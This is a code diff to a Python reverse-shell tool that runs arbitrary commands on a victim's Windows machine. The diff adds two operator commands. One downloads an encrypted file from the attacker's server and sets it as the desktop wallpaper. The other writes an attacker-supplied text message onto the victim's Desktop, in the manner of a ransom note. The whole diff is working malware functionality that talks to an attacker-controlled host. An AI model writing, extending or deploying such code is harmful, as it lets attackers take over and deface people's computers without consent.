@@ -5,8 +5,8 @@ import socket
 import subprocess
 import requests
 import os
+import ctypes
 import tarfile
-import io
 
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
 from cryptography.hazmat.backends import default_backend
@@ -25,6 +25,14 @@ def chacha20_decrypt(data, key, nonce):
     cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
     decryptor = cipher.decryptor()
     return decryptor.update(data)
+
+def set_wallpaper(path):
+    SPI_SETDESKWALLPAPER = 20
+    SPIF_UPDATEINIFILE = 0x1
+    SPIF_SENDCHANGE = 0x2
+    result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
+    if not result:
+        raise Exception("Error setting wallpaper")
 
 def reverse_shell(server_ip, server_port):
     mlkem = ML_KEM_1024
@@ -86,6 +94,28 @@ def reverse_shell(server_ip, server_port):
                 file_destination = os.path.basename(filename)
                 with open(file_destination, 'wb') as f:
                     f.write(decompressed_content)
+                output = None
+            elif command.lower().startswith("-wallpaper "):
+                filename = command.split(" ", 1)[1]
+                response = requests.post('http://' + server_ip + ':' + str(server_port + 1) + '/u', headers={'Filename': filename})
+                desencrypted_content = chacha20_decrypt(response.content, key, nonce)
+                decompressed_content = ZstdDecompressor().decompress(desencrypted_content)
+                wallpaper_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Themes", "CachedFiles")
+                if not os.path.exists(wallpaper_folder):
+                    os.makedirs(wallpaper_folder)
+                file_destination = os.path.join(wallpaper_folder, os.path.basename(filename))
+                with open(file_destination, 'wb') as f:
+                    f.write(decompressed_content)
+                set_wallpaper(file_destination)
+                output = None
+            elif command.lower().startswith("-txt "):
+                filename = command.split(" ", 1)[1].split("///")[0]
+                message = command.split(" ", 1)[1].split("///")[1]
+                desktop_folder = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+
+                file_destination = os.path.join(desktop_folder, os.path.basename(filename))
+                with open(file_destination, 'wb') as f:
+                    f.write(message.encode('utf-8'))
                 output = None
             else:
                 output = subprocess.getoutput(command)
